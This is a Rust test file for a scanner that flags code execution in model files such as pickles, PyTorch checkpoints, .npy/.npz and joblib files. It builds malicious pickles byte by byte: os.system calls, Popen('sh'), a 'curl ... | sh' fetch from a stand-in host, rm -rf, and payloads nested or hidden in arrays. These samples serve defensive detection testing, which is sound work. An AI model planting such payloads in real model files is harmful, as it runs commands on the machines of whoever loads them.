//! FP-MODEL-FILES: model files built byte by byte (inert: nothing here is unpickled or loaded), read for what they
//! would run.

use super::*;
use crate::pystr::u;

/// A pickle written opcode by opcode.
#[derive(Default, Clone)]
struct P(Vec<u8>);

impl P {
    fn proto(mut self, n: u8) -> P {
        self.0.extend([0x80, n]);
        self
    }
    fn raw(mut self, b: &[u8]) -> P {
        self.0.extend_from_slice(b);
        self
    }
    /// GLOBAL (protocol 0's line form)
    fn global(self, m: &str, n: &str) -> P {
        self.raw(format!("c{m}\n{n}\n").as_bytes())
    }
    fn s(mut self, t: &str) -> P {
        // SHORT_BINUNICODE
        self.0.push(0x8c);
        self.0.push(t.len() as u8);
        self.0.extend_from_slice(t.as_bytes());
        self
    }
    fn stack_global(self) -> P {
        self.raw(&[0x93])
    }
    fn memoize(self) -> P {
        self.raw(&[0x94])
    }
    fn binput(self, i: u8) -> P {
        self.raw(&[b'q', i])
    }
    fn binget(self, i: u8) -> P {
        self.raw(&[b'h', i])
    }
    fn int(self, n: u8) -> P {
        self.raw(&[b'K', n])
    }
    fn bytes(mut self, b: &[u8]) -> P {
        self.0.push(b'B');
        self.0.extend_from_slice(&(b.len() as u32).to_le_bytes());
        self.0.extend_from_slice(b);
        self
    }
    fn t1(self) -> P {
        self.raw(&[0x85])
    }
    fn t2(self) -> P {
        self.raw(&[0x86])
    }
    fn t3(self) -> P {
        self.raw(&[0x87])
    }
    fn et(self) -> P {
        self.raw(b")")
    }
    fn ed(self) -> P {
        self.raw(b"}")
    }
    fn mark(self) -> P {
        self.raw(b"(")
    }
    fn tuple(self) -> P {
        self.raw(b"t")
    }
    fn setitems(self) -> P {
        self.raw(b"u")
    }
    fn setitem(self) -> P {
        self.raw(b"s")
    }
    fn reduce(self) -> P {
        self.raw(b"R")
    }
    fn newobj(self) -> P {
        self.raw(&[0x81])
    }
    fn build(self) -> P {
        self.raw(b"b")
    }
    fn none(self) -> P {
        self.raw(b"N")
    }
    fn binpersid(self) -> P {
        self.raw(b"Q")
    }
    fn stop(self) -> Vec<u8> {
        let mut v = self.0;
        v.push(b'.');
        v
    }
}

fn rd(path: &str, data: &[u8]) -> Option<Report> {
    let p = crate::pack::current();
    read_file(&p, &u(path), data, data.len() as u64, None, false)
}

/// (rule, severity, message) of each issue, and of each call with text the report holds for model_own (MAJOR, unless
/// whatever the scan's source says: own_imports).
fn rules(r: &Report) -> Vec<(String, String, String)> {
    r.issues.iter().chain(r.calls.iter().map(|(_, _, i)| i)).map(|i| {
        let a = i.as_arr().unwrap();
        let s = |k: usize| pystr::to_string(a[k].as_str().unwrap());
        (s(0), s(3), s(4))
    }).collect()
}

fn one(path: &str, data: &[u8]) -> Vec<(String, String, String)> {
    rules(&rd(path, data).expect("a model file"))
}

fn has(found: &[(String, String, String)], rule: &str, sev: &str, needle: &str) -> bool {
    found.iter().any(|(r, s, m)| r == rule && s == sev && m.contains(needle))
}

/// torch.save's data.pkl for {"w": tensor}: an OrderedDict of _rebuild_tensor_v2 calls on persistent storages
/// (MARK 'storage' FloatStorage '0' 'cpu' 4 TUPLE BINPERSID, offset 0, size (2, 2), stride (2, 1), False, OrderedDict()).
fn state_dict() -> Vec<u8> {
    P::default().proto(2)
        .global("collections", "OrderedDict").et().reduce().binput(0)
        .s("w")
        .global("torch._utils", "_rebuild_tensor_v2")
        .mark().mark().s("storage").global("torch", "FloatStorage").s("0").s("cpu").int(4).tuple().binpersid()
        .int(0).int(2).int(2).t2().int(2).int(1).t2().raw(&[0x89])
        .global("collections", "OrderedDict").et().reduce()
        .tuple().reduce()
        .setitem()
        .stop()
}

/// A zip of stored entries (with their CRCs), as torch.save and numpy.savez write them.
fn zip_of(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let crc = |b: &[u8]| lazaret_verify::inflate::crc32(0, b);
    let mut out = Vec::new();
    let mut cd = Vec::new();
    for (name, body) in entries {
        let off = out.len() as u32;
        out.extend_from_slice(b"PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00");
        out.extend_from_slice(&crc(body).to_le_bytes());
        out.extend_from_slice(&(body.len() as u32).to_le_bytes());
        out.extend_from_slice(&(body.len() as u32).to_le_bytes());
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(name.as_bytes());
        out.extend_from_slice(body);
        cd.extend_from_slice(b"PK\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00");
        cd.extend_from_slice(&crc(body).to_le_bytes());
        cd.extend_from_slice(&(body.len() as u32).to_le_bytes());
        cd.extend_from_slice(&(body.len() as u32).to_le_bytes());
        cd.extend_from_slice(&(name.len() as u16).to_le_bytes());
        cd.extend_from_slice(&[0u8; 12]);
        cd.extend_from_slice(&off.to_le_bytes());
        cd.extend_from_slice(name.as_bytes());
    }
    let cd_off = out.len() as u32;
    out.extend_from_slice(&cd);
    out.extend_from_slice(b"PK\x05\x06\x00\x00\x00\x00");
    out.extend_from_slice(&(entries.len() as u16).to_le_bytes());
    out.extend_from_slice(&(entries.len() as u16).to_le_bytes());
    out.extend_from_slice(&(cd.len() as u32).to_le_bytes());
    out.extend_from_slice(&cd_off.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out
}

/// A torch.save checkpoint whose data.pkl is `pkl`.
fn checkpoint(pkl: &[u8]) -> Vec<u8> {
    zip_of(&[("golden/data.pkl", pkl), ("golden/.format_version", b"1"), ("golden/.storage_alignment", b"64"),
             ("golden/byteorder", b"little"), ("golden/data/0", &[0u8; 16]), ("golden/version", b"3\n"),
             ("golden/.data/serialization_id", b"1234")])
}

/// A zlib stream of stored blocks (no compressor needed): what zlib.decompress reads.
fn zlib_stored(data: &[u8]) -> Vec<u8> {
    let mut out = vec![0x78, 0x01];
    let chunks: Vec<&[u8]> = if data.is_empty() { vec![&[][..]] } else { data.chunks(65_535).collect() };
    for (k, c) in chunks.iter().enumerate() {
        out.push(if k + 1 == chunks.len() { 1 } else { 0 });
        out.extend_from_slice(&(c.len() as u16).to_le_bytes());
        out.extend_from_slice(&(!(c.len() as u16)).to_le_bytes());
        out.extend_from_slice(c);
    }
    out.extend_from_slice(&lazaret_verify::inflate::adler32(1, data).to_be_bytes());
    out
}

fn gzip_stored(data: &[u8]) -> Vec<u8> {
    let mut out = vec![0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 255];
    let z = zlib_stored(data);
    out.extend_from_slice(&z[2..z.len() - 4]);
    out.extend_from_slice(&lazaret_verify::inflate::crc32(0, data).to_le_bytes());
    out.extend_from_slice(&(data.len() as u32).to_le_bytes());
    out
}

/// An .npy of one dtype and shape, and the bytes after its header.
fn npy(descr: &str, after: &[u8]) -> Vec<u8> {
    let mut h = format!("{{'descr': {descr}, 'fortran_order': False, 'shape': (3,), }}");
    while (10 + h.len() + 1) % 64 != 0 {
        h.push(' ');
    }
    h.push('\n');
    let mut out = b"\x93NUMPY\x01\x00".to_vec();
    out.extend_from_slice(&(h.len() as u16).to_le_bytes());
    out.extend_from_slice(h.as_bytes());
    out.extend_from_slice(after);
    out
}

fn os_system(cmd: &str) -> Vec<u8> {
    P::default().proto(2).global("os", "system").s(cmd).t1().reduce().stop()
}

#[test]
fn a_tensor_checkpoint_is_quiet_and_not_an_archive() {
    let pkl = state_dict();
    let r = rd("golden/golden.pt", &checkpoint(&pkl)).expect("a checkpoint");
    assert_eq!(r.kind, "pytorch");
    assert!(r.issues.is_empty(), "{:?}", rules(&r));
    assert!(!r.opaque);
    assert!(r.imports.is_empty());
    // the same data.pkl as a plain pickle, and in the legacy format
    assert!(one("model.pkl", &pkl).is_empty());
    let legacy = [super::TORCH_MAGIC.to_vec(), P::default().proto(2).raw(b"M\xe9\x03").stop(),
                  P::default().proto(2).ed().stop(), pkl.clone(), P::default().proto(2).raw(b"]").stop(),
                  vec![0u8; 24]].concat();
    let r = rd("old.pth", &legacy).expect("legacy");
    assert_eq!(r.kind, "pytorch-legacy");
    assert!(r.issues.is_empty(), "{:?}", rules(&r));
}

#[test]
fn code_globals_are_critical_however_they_are_reached() {
    // GLOBAL + REDUCE
    let f = one("m.pkl", &os_system("id"));
    assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "it calls os.system with 'id'"), "{f:?}");
    // STACK_GLOBAL with memoized strings, in another order
    let sg = P::default().proto(4).s("os").memoize().s("system").memoize().s("noise").raw(b"0")
        .binget(0).binget(1).stack_global().s("id").t1().reduce().stop();
    assert!(has(&one("m.pkl", &sg), "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    // BINPUT/BINGET and protocol 0's INST, OBJ, NEWOBJ
    let inst = b"(S'id'\nios\nsystem\n.".to_vec();
    assert!(has(&one("m.pkl", &inst), "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    let obj = P::default().proto(2).mark().global("subprocess", "Popen").s("sh").raw(b"o").stop();
    assert!(has(&one("m.pkl", &obj), "SC-PICKLE-CODE", "CRITICAL", "subprocess.Popen"));
    let newobj = P::default().proto(2).global("subprocess", "Popen").s("sh").t1().newobj().stop();
    assert!(has(&one("m.pkl", &newobj), "SC-PICKLE-CODE", "CRITICAL", "subprocess.Popen and makes one"));
    // Python 2's names, nt and posix, a dotted path through a module, builtins
    for (m, n) in [("__builtin__", "eval"), ("posix", "system"), ("nt", "system"), ("torch.serialization", "os.system"),
                   ("builtins", "exec"), ("runpy", "_run_code"), ("webbrowser", "open"), ("socket", "socket"),
                   ("commands", "getoutput"), ("torch", "load"), ("torch.hub", "load"), ("pickle", "loads"),
                   ("marshal", "loads"), ("builtins", "getattr"), ("importlib", "import_module"), ("ctypes", "CDLL"),
                   ("shutil", "rmtree"), ("code", "interact"), ("pty", "spawn"), ("sys", "exit"),
                   ("numpy.testing._private.utils", "runstring"), ("collections", "__builtins__.eval")] {
        let b = P::default().proto(4).s(m).s(n).stack_global().s("x").t1().reduce().stop();
        assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", ""), "{m}.{n}");
    }
}

#[test]
fn build_setstate_and_class_shapes_are_critical() {
    // an object whose __setstate__ becomes os.system: the next BUILD calls it
    let b = P::default().proto(2).global("argparse", "Namespace").et().newobj()
        .ed().s("__setstate__").global("collections", "OrderedDict").setitem().build()
        .s("id").build().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", "gives __setstate__ the callable collections.OrderedDict"));
    // BUILD on a class itself (its attributes changed)
    let b = P::default().proto(2).global("somepkg.mod", "Cls").ed().build().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", "changes somepkg.mod.Cls itself"));
    // a class made with type()
    let b = P::default().proto(2).global("builtins", "type").s("X").et().ed().t3().reduce().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", "makes a class"));
    // text naming code handed to an installed function
    let b = P::default().proto(2).global("somepkg.util", "import_string").s("os.system").t1().reduce().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", "'os.system', which names code"));
    // numpy's _ufunc_reconstruct importing os.system, then called
    let b = P::default().proto(2).global("numpy.core", "_ufunc_reconstruct").s("os").s("system").t2().reduce()
        .s("id").t1().reduce().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    // a computed object called: MAJOR
    let b = P::default().proto(2).global("somepkg", "factory").et().reduce().int(1).t1().reduce().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-GLOBAL", "MAJOR", "calls what somepkg.factory(…) returned"));
}

#[test]
fn other_globals_count_when_called_with_text() {
    // with a command: MAJOR
    let b = P::default().proto(2).global("somepkg.util", "run").s("rm -rf /tmp/x").t1().reduce().stop();
    let f = one("m.pkl", &b);
    assert!(has(&f, "SC-PICKLE-GLOBAL", "MAJOR", "it calls somepkg.util.run with 'rm -rf /tmp/x' (REDUCE, byte"), "{f:?}");
    // numbers, plain names, objects: what restoring an object is (sklearn's Tree, pandas' StringDtype)
    let b = P::default().proto(2).global("sklearn.tree._tree", "Tree").int(4).global("numpy", "ndarray").int(1).t3()
        .reduce().stop();
    assert!(one("m.pkl", &b).is_empty());
    let b = P::default().proto(2).global("pandas", "StringDtype").s("python").global("builtins", "float").t2().reduce().stop();
    assert!(one("m.pkl", &b).is_empty());
    // a reconstructor handed the class it rebuilds (Cython's __pyx_unpickle_*, pandas' _new_Index)
    let b = P::default().proto(2).global("pandas.core.indexes.base", "_new_Index").global("pandas", "Index")
        .ed().s("name").s("my col").setitem().t2().reduce().stop();
    assert!(one("m.pkl", &b).is_empty());
    // one call in a reconstructor's shape does not clear another call of the same function
    let b = P::default().proto(2).global("pkg", "f").binput(0).global("pkg", "Cls").t1().reduce().raw(b"0")
        .binget(0).s("rm -rf /tmp/x").t1().reduce().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-GLOBAL", "MAJOR", "pkg.f with 'rm -rf /tmp/x'"));
    // objects remade by NEWOBJ and BUILD
    let b = P::default().proto(2).global("sklearn.linear_model._logistic", "LogisticRegression").et().newobj()
        .ed().s("C").raw(b"G\x3f\xf0\x00\x00\x00\x00\x00\x00").setitem().s("solver").s("lbfgs").setitem().build().stop();
    let r = rd("m.pkl", &b).unwrap();
    assert!(r.issues.is_empty());
    assert_eq!(r.imports, vec![("sklearn.linear_model._logistic".into(), "LogisticRegression".into(), "made".into())]);
}

#[test]
fn plain_data_and_hyperparameters_are_quiet() {
    // Lightning's hyperparameters: a Namespace, paths, datetimes, partial, typing, defaultdict
    let b = P::default().proto(2).ed().mark()
        .s("ns").global("argparse", "Namespace").et().newobj().ed().s("lr").int(1).setitem().build()
        .s("path").global("pathlib", "PosixPath").s("ckpt/last.ckpt").t1().reduce()
        .s("path3").global("pathlib._local", "PurePosixPath").s("/data/x").t1().reduce()
        .s("opt").global("functools", "partial").global("torch.optim", "Adam").t1().reduce()
        .s("typ").global("_operator", "getitem").global("typing", "List").global("builtins", "int").t2().reduce()
        .s("dd").global("collections", "defaultdict").global("builtins", "list").t1().reduce()
        .s("when").global("datetime", "datetime").bytes(b"\x07\xea\x0a\x14\x0c\x00\x00\x00\x00\x00").t1().reduce()
        .setitems().stop();
    assert!(one("hparams.pkl", &b).is_empty(), "{:?}", one("hparams.pkl", &b));
    // protocol 0's copy_reg._reconstructor
    let b = b"ccopy_reg\n_reconstructor\np0\n(cargparse\nNamespace\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nS'lr'\np6\nF0.1\nsb.".to_vec();
    assert!(one("hp.pkl", &b).is_empty(), "{:?}", one("hp.pkl", &b));
    // _reconstructor with a base that is not object: the base is called with the state
    let b = P::default().proto(2).global("copyreg", "_reconstructor").global("x", "Y").global("subprocess", "Popen")
        .s("sh").t3().reduce().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", "subprocess.Popen"));
}

#[test]
fn checkpoints_hostile_shapes() {
    // os.system in data.pkl
    let r = rd("model.pt", &checkpoint(&os_system("curl -s http://x.invalid/a | sh"))).unwrap();
    assert!(has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "golden/data.pkl"), "{:?}", rules(&r));
    // a second data.pkl after a clean one
    let z = zip_of(&[("a/data.pkl", &state_dict()), ("a/version", b"3\n"), ("b/data.pkl", &os_system("id"))]);
    assert!(has(&one("x.bin", &z), "SC-PICKLE-CODE", "CRITICAL", "b/data.pkl"));
    // a nested pickle handed to pickle.loads inside data.pkl
    let inner = os_system("id");
    let outer = P::default().proto(2).global("pickle", "loads").bytes(&inner).t1().reduce().stop();
    let f = one("m.pt", &checkpoint(&outer));
    assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "pickle.loads") && has(&f, "SC-PICKLE-CODE", "CRITICAL", "the bytes golden/data.pkl hands pickle.loads"), "{f:?}");
    // torch.storage._load_from_bytes: benign legacy bytes are quiet, hostile ones are what they run
    let legacy_ok = [super::TORCH_MAGIC.to_vec(), P::default().proto(2).raw(b"M\xe9\x03").stop(),
                     P::default().proto(2).ed().stop(), state_dict(), P::default().proto(2).raw(b"]").stop()].concat();
    let b = P::default().proto(2).global("torch.storage", "_load_from_bytes").bytes(&legacy_ok).t1().reduce().stop();
    assert!(one("m.pkl", &b).is_empty(), "{:?}", one("m.pkl", &b));
    let legacy_bad = [super::TORCH_MAGIC.to_vec(), P::default().proto(2).raw(b"M\xe9\x03").stop(),
                      P::default().proto(2).ed().stop(), os_system("id"), P::default().proto(2).raw(b"]").stop()].concat();
    let b = P::default().proto(2).global("torch.storage", "_load_from_bytes").bytes(&legacy_bad).t1().reduce().stop();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    // a folder's own entry is no member of its own; a .pkl of another name is read too, and is not the format's
    let z = zip_of(&[("a/", b""), ("a/data.pkl", &state_dict()), ("a/data/", b""), ("a/extra.pkl", &os_system("id"))]);
    let r = rd("m.pt", &z).unwrap();
    assert!(r.opaque && has(&rules(&r), "SC-PICKLE-CODE", "CRITICAL", "a/extra.pkl"), "{:?}", rules(&r));
    // members a checkpoint does not have keep SC-NESTED-ARCHIVE (opaque); a program among them is SC-BINARY, named
    let z = zip_of(&[("a/data.pkl", &state_dict()), ("a/payload.exe", b"MZ\x90\x00")]);
    let r = rd("m.pt", &z).unwrap();
    assert!(r.opaque && has(&rules(&r), "SC-BINARY", "MAJOR", "In a/payload.exe"), "{:?}", rules(&r));
}

#[test]
fn numpy_object_arrays_are_pickles() {
    let ok = npy("'<f8'", &[0u8; 24]);
    let r = rd("a.npy", &ok).unwrap();
    assert!(r.issues.is_empty() && r.kind == "numpy");
    let bad = npy("'|O'", &os_system("id"));
    assert!(has(&one("a.npy", &bad), "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    let st = npy("[('a', '<i4'), ('b', '|O')]", &os_system("id"));
    assert!(has(&one("s.npy", &st), "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    // in an .npz
    let z = zip_of(&[("w.npy", &ok), ("o.npy", &bad)]);
    let f = one("x.npz", &z);
    assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "o.npy"), "{f:?}");
    let z = zip_of(&[("w.npy", &ok), ("v.npy", &npy("'<i8'", &[0u8; 24]))]);
    let r = rd("x.npz", &z).unwrap();
    assert!(r.issues.is_empty() && !r.opaque);
}

/// joblib's NumpyArrayWrapper for an array of `n` float64s, aligned (joblib >= 1.2) or not.
fn wrapper(n: u8, aligned: bool) -> P {
    let mut p = P::default().global("joblib.numpy_pickle", "NumpyArrayWrapper").et().newobj().ed().mark()
        .s("subclass").global("numpy", "ndarray")
        .s("shape").int(n).t1()
        .s("order").s("C")
        .s("dtype").global("numpy", "dtype").s("f8").raw(&[0x89, 0x88]).t3().reduce()
        .mark().int(3).s("<").none().none().none().raw(b"J\xff\xff\xff\xffJ\xff\xff\xff\xff").int(0).tuple().build()
        .s("allow_mmap").raw(&[0x88]);
    if aligned {
        p = p.s("numpy_array_alignment_bytes").int(16);
    }
    p.setitems().build()
}

#[test]
fn joblib_arrays_are_skipped_as_joblib_reads_them() {
    // aligned: a padding byte (1..16, never an opcode), padding, the array
    let mut b = P::default().proto(4).ed().s("coef_").0;
    b.extend(wrapper(3, true).0);
    b.extend([5u8, 0xff, 0xff, 0xff, 0xff, 0xff]);
    b.extend([0x41u8; 24]);
    b.extend(P::default().setitem().stop());
    assert!(one("model.joblib", &b).is_empty(), "{:?}", one("model.joblib", &b));
    // compressed with zlib and gzip
    assert!(one("model.joblib", &zlib_stored(&b)).is_empty());
    assert!(one("model.pkl.gz", &gzip_stored(&b)).is_empty());
    // bzip2: not decompressed
    assert!(has(&one("model.pkl.bz2", b"BZh91AY&SY\x00\x00"), "SC-TRUNCATED", "CRITICAL", "bzip2"));
    // an object array: a nested pickle follows the wrapper
    let mut b = P::default().proto(4).ed().s("o").0;
    b.extend(P::default().global("joblib.numpy_pickle", "NumpyArrayWrapper").et().newobj().ed().mark()
        .s("shape").int(1).t1().s("dtype").global("numpy", "dtype").s("O8").raw(&[0x89, 0x88]).t3().reduce()
        .mark().int(3).s("|").none().none().none().raw(b"J\xff\xff\xff\xffJ\xff\xff\xff\xff").int(63).tuple().build()
        .setitems().build().0);
    b.extend(os_system("id"));
    b.extend(P::default().setitem().stop());
    assert!(has(&one("m.joblib", &b), "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    // unaligned (old joblib): plain pickle.load would read the array's bytes as opcodes, so they are read that way too
    let payload = os_system("id");
    let mut b = P::default().proto(2).ed().s("coef_").0;
    b.extend(wrapper(payload.len().div_ceil(8) as u8, false).0);
    let mut arr = payload.clone();
    arr.resize(payload.len().div_ceil(8) * 8, 0);
    b.extend(arr);
    b.extend(P::default().setitem().stop());
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-CODE", "CRITICAL", "os.system"), "{:?}", one("m.pkl", &b));
    // an array past the file's end
    let mut b = P::default().proto(4).ed().s("c").0;
    b.extend(wrapper(200, true).0);
    b.extend([1u8, 0xff]);
    assert!(has(&one("m.joblib", &b), "SC-TRUNCATED", "CRITICAL", "runs past the file's end"));
}

#[test]
fn what_cannot_be_read_is_truncated() {
    // cut short (the payload before the cut is still reported)
    let mut b = os_system("id");
    b.pop();
    let f = one("m.pkl", &b);
    assert!(has(&f, "SC-TRUNCATED", "CRITICAL", "ends before its STOP"), "{f:?}");
    assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "os.system"));
    // an opcode no protocol has
    assert!(has(&one("m.pkl", b"\x80\x02N\xff."), "SC-TRUNCATED", "CRITICAL", "opcode 0xff"));
    // a STACK_GLOBAL of what is not a string, a GET of what was never put
    assert!(has(&one("m.pkl", b"\x80\x04K\x01K\x02\x93."), "SC-TRUNCATED", "CRITICAL", "not strings"));
    assert!(has(&one("m.pkl", b"\x80\x02h\x05."), "SC-TRUNCATED", "CRITICAL", "never written"));
    // a checkpoint whose data.pkl is deflated with a method the reader cannot undo
    let mut z = checkpoint(&state_dict());
    z[8] = 12; // the first local header's method: bzip2
    let k = z.windows(4).position(|w| w == b"PK\x01\x02").unwrap();
    z[k + 10] = 12;
    assert!(has(&one("m.pt", &z), "SC-TRUNCATED", "CRITICAL", "bzip2"));
    // a file larger than the scan reads, by its first bytes
    let p = crate::pack::current();
    let r = read_file(&p, &u("big.pt"), &checkpoint(&state_dict())[..64], 50_000_000, Some(16_000_000), false).unwrap();
    assert!(has(&rules(&r), "SC-TRUNCATED", "CRITICAL", "50,000,000 bytes exceeds the 16,000,000-byte file limit"));
    // a big .npz is left as it was (an archive), not truncated
    let z = zip_of(&[("w.npy", &npy("'<f8'", &[0u8; 24]))]);
    assert!(read_file(&p, &u("x.npz"), &z[..40], 50_000_000, Some(16_000_000), false).is_none());
}

#[test]
fn what_is_not_a_model_file_is_left_alone() {
    let p = crate::pack::current();
    for (name, data) in [("a.bin", &b"\x80\x02\x00\x01"[..]), ("notes.txt", b"cats\ndogs\nbirds\n"),
                         ("x.zip", &zip_of(&[("readme.txt", b"hi")])[..]), ("a.png", b"\x89PNG\r\n\x1a\n"),
                         ("a.gz", &gzip_stored(b"plain text, not a pickle")[..])] {
        assert!(!sniff(&p, &u(name), data, false) || rd(name, data).is_none(), "{name}");
    }
    // text that is a whole protocol 0 pickle is one, whatever its name
    let f = one("data.txt", b"cos\nsystem\n(S'id'\ntR.");
    assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "os.system"));
}

#[test]
fn reading_is_bounded() {
    // millions of opcodes: linear
    let mut b = vec![0x80, 2];
    for _ in 0..1_500_000 {
        b.extend_from_slice(b"N0");
    }
    b.push(b'.');
    let t = std::time::Instant::now();
    assert!(one("m.pkl", &b).is_empty());
    assert!(t.elapsed().as_secs() < 20);
    // values nested two million deep, and a million calls of what the last returned: dropped without recursion
    let mut b = vec![0x80, 2];
    b.extend(std::iter::repeat_n(b'(', 2_000_000));
    b.push(b']');
    b.extend(std::iter::repeat_n(b'l', 2_000_000));
    b.push(b'.');
    assert!(one("deep.pkl", &b).is_empty());
    let mut b = P::default().proto(2).global("pkg", "f").0;
    for _ in 0..1_000_000 {
        b.extend_from_slice(b")R");
    }
    b.push(b'.');
    assert!(has(&one("chain.pkl", &b), "SC-PICKLE-GLOBAL", "MAJOR", "calls what"));
    // a container put in itself, and two in each other: no cycle is made
    assert!(one("self.pkl", b"\x80\x02]q\x00h\x00a.").is_empty());
    assert!(one("pair.pkl", b"\x80\x02]q\x00]q\x01h\x00h\x01ah\x01h\x00a0.").is_empty());
    // the format's helpers handed helpers 100,000 deep: followed MAX_DISPATCH deep
    let mut b = P::default().proto(2).global("torch._tensor", "_rebuild_from_type_v2").binput(0).raw(b"0")
        .global("torch", "Tensor").binput(1).raw(b"0").raw(b"h\x00").0;
    for _ in 0..100_000 {
        b.extend_from_slice(b"(h\x00h\x01");
    }
    b.push(b')');
    for _ in 0..100_000 {
        b.extend_from_slice(b"Nt");
    }
    b.extend_from_slice(b"R.");
    assert!(has(&one("nest.pkl", &b), "SC-PICKLE-GLOBAL", "MAJOR", "nested past 16 helpers"));
    // the memo past its bound
    let mut b = vec![0x80, 4, b'N'];
    b.extend(std::iter::repeat_n(0x94u8, vm::MAX_MEMO + 1));
    b.push(b'.');
    assert!(has(&one("m.pkl", &b), "SC-TRUNCATED", "CRITICAL", "memo entries"));
    // a memoized container handed to many calls: each looks at a bounded part of it
    let mut b = P::default().proto(2).mark();
    for _ in 0..500 {
        b = b.s("rm -rf x");
    }
    let mut b = b.raw(b"l").binput(0).0;
    for _ in 0..20_000 {
        b.extend(P::default().global("pkg", "f").binget(0).t1().reduce().raw(b"0").0);
    }
    b.extend(P::default().stop());
    let t = std::time::Instant::now();
    assert!(has(&one("m.pkl", &b), "SC-PICKLE-GLOBAL", "MAJOR", "pkg.f"));
    assert!(t.elapsed().as_secs() < 20);
}

#[test]
fn text_kinds() {
    let p = crate::pack::current();
    let c = Classes::of(&p);
    let k = |s: &str| c.text_kind(s.as_bytes(), s.len());
    assert_eq!(k("python"), TextKind::Word);
    assert_eq!(k(""), TextKind::Plain);
    assert_eq!(k("os.system"), TextKind::CodeName);
    assert_eq!(k("subprocess:Popen"), TextKind::CodeName);
    assert_eq!(k("builtins.eval"), TextKind::CodeName);
    assert_eq!(k("sklearn.tree.Tree"), TextKind::Text);
    assert_eq!(k("America/New_York"), TextKind::Word);
    assert_eq!(k("First Name"), TextKind::Word);
    assert_eq!(k("<f8"), TextKind::Word);
    assert_eq!(k("rm -rf /tmp/x"), TextKind::Text);
    assert_eq!(k("curl x | sh"), TextKind::Text);
    assert_eq!(k("http://192.0.2.1/a"), TextKind::Text);
    assert_eq!(k("/etc/passwd"), TextKind::Text);
    assert_eq!(k("~/.ssh/id_rsa"), TextKind::Text);
    assert_eq!(k("C:\\Windows\\x"), TextKind::Text);
    assert_eq!(k("import os; os.system('x')"), TextKind::Text);
    assert_eq!(k(&"a".repeat(201)), TextKind::Text);
    assert_eq!(c.classify(b"__builtin__", b"set").0, Kind::Safe);
    assert_eq!(c.classify(b"copy_reg", b"_reconstructor").1, Model::Reconstructor);
    assert_eq!(c.classify(b"torch._utils", b"_rebuild_tensor_v2").0, Kind::Safe);
    assert_eq!(c.classify(b"__torch__.foo", b"Net").0, Kind::Other);
    assert_eq!(c.classify_in(b"__torch__.foo", b"Net", true).0, Kind::Safe);
    assert_eq!(c.classify(b"os.path", b"join").0, Kind::Code);
    assert_eq!(c.classify(b"codecs", b"encode").0, Kind::Safe);
    assert_eq!(c.classify(b"sklearn.tree._tree", b"Tree").0, Kind::Other);
}

#[test]
fn own_modules() {
    let p = crate::pack::current();
    let imp = vec![("mypkg.model".to_string(), "Net".to_string(), "made".to_string()),
                   ("sklearn.tree._classes".to_string(), "DecisionTreeClassifier".to_string(), "made".to_string())];
    let files = vec![(u("mypkg/__init__.py"), false, None), (u("mypkg/model.py"), false, None),
                     (u(".venv/lib/python3.12/site-packages/sklearn/tree/_classes.py"), true, None)];
    let got = own_imports(&p, &[(u("assets/m.pkl"), false, imp.clone(), vec![])], &files);
    assert_eq!(got.len(), 1);
    let msg = pystr::to_string(got[0].1.as_arr().unwrap()[4].as_str().unwrap());
    assert!(msg.contains("mypkg.model (Net"), "{msg}");
    // listed, setting no verdict: the module is the package's own code, which the scan reads (John, Oct 21)
    let row = got[0].1.as_arr().unwrap();
    assert_eq!(pystr::to_string(row[0].as_str().unwrap()), "SC-PICKLE-GLOBAL");
    assert_eq!(pystr::to_string(row[3].as_str().unwrap()), "INFO");
    // a dependency's model file and its own package's module; not another package's
    let dep_imp = vec![("sklearn.tree._classes".to_string(), "DecisionTreeClassifier".to_string(), "made".to_string())];
    let got = own_imports(&p, &[(u(".venv/lib/python3.12/site-packages/sklearn/data/m.pkl"), true, dep_imp.clone(), vec![])], &files);
    assert_eq!(got.len(), 1);
    let got = own_imports(&p, &[(u(".venv/lib/python3.12/site-packages/other/m.pkl"), true, dep_imp, vec![])], &files);
    assert!(got.is_empty());
}

#[test]
fn a_call_with_text_is_major_whatever_the_scans_source_says() {
    // an enum member pickles as cls(value), and a value may be a URL, a path or a dotted name: held by model_file for
    // model_own, which reports it MAJOR whatever the scan's source defines (H3, the external re-review of Oct 27: which
    // file the name is when the file is loaded is the loading program's import path, not the scan's: sys.path set by
    // a file, a comment that reads as a setup.py's package_dir, an `enum.py` of the project's, an alias of the class
    // whose _missing_ is set); the own module's import is INFO beside it
    let p = crate::pack::current();
    let pkl = |m: &str, v: &str| P::default().proto(2).global(m, "Source").s(v).t1().reduce().stop();
    let r = rd("m.pkl", &pkl("mypkg.kinds", "https://huggingface.co/datasets/x")).unwrap();
